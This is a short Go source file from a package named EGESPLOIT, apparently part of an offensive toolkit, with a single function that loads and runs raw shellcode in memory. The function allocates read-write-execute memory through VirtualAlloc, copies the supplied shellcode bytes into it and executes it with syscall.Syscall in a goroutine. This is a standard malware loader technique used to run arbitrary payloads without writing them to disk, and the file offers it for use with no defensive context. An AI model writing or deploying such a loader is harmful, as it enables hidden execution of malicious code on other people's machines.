package EGESPLOIT

import "syscall"
import "unsafe"


func SyscallExecute(Shellcode []byte) (bool){

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))

	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}

	go syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}
